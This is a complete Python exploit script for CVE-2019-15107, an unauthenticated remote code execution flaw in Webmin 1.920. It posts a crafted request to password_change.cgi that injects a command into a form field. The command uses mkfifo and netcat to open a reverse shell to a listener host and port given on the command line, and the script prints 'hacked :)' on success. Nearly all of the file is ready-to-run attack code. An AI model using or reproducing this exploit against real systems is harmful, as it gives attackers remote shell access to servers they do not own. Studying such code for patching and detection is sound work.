import argparse
import requests
import sys
import base64
from log_colors import *
requests.packages.urllib3.disable_warnings()

# CVE-2019-15107
# Webmin v.1.920 unauthenticated RCE
class CVE2019_15107:
    headers = {"User-Agent" : "Mozilla/5.0"}

    def __init__(self, rhost, lhost, lport):
        print (LogColors.BLUE + "victim: " + rhost  + "..." + LogColors.ENDC)
        url = "http://{}:10000".format(rhost)
        self.url = url.rstrip("/")
        self.lhost, self.lport = lhost, lport
        self.s = requests.Session()
        self.s.headers.update(self.headers)

    # prepare payload
    def prepare_payload(self):
        print (LogColors.BLUE + "prepare rev shell payload..." + LogColors.ENDC)
        payload = "user=root&pam=&expired=2&old=test | "
        payload += "mkfifo%20%2Ftmp%2Fuirolsd%3B%20nc%20" + self.lhost + "%20" + self.lport
        payload += "%200%3C%2Ftmp%2Fuirolsd%20%7C%20%2Fbin"
        payload += "%2Fsh%20%3E%2Ftmp%2Fuirolsd%202%3E%261%3B%20rm%20%2F"
        payload += "tmp%2Fuirolsd&new1=test&new2=test"
        print (LogColors.YELLOW + payload + LogColors.ENDC)
        print (LogColors.YELLOW + "successfully generate payload..." + LogColors.ENDC)
        self.payload = payload

    # send payload
    def send_payload(self):
        print (LogColors.BLUE + "send payload with reverse shell..." + LogColors.ENDC)
        headers = {
            "Referer": self.url + "/session_login.cgi",
            "Cookie" : "redirect=1; testing=1; sid=x; sessiontest=1",
        }
        try:
            r = self.s.post(self.url + "/password_change.cgi",
                data = self.payload, headers = headers, verify = False
            )
        except:
            print (LogColors.GREEN + "successfully send payload. hacked :)" + LogColors.ENDC)

    # exploitation logic
    def exploit(self):
        self.prepare_payload()
        self.send_payload()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-r','--rhost', required = True, help = "target victim host")
    parser.add_argument('-i','--ip', required = True, help = "revshell listener ip")
    parser.add_argument('-p','--port', required = True, help = "revshell listener port")
    args = vars(parser.parse_args())
    cve = CVE2019_15107(args["rhost"], args["ip"], args["port"])
    cve.exploit()

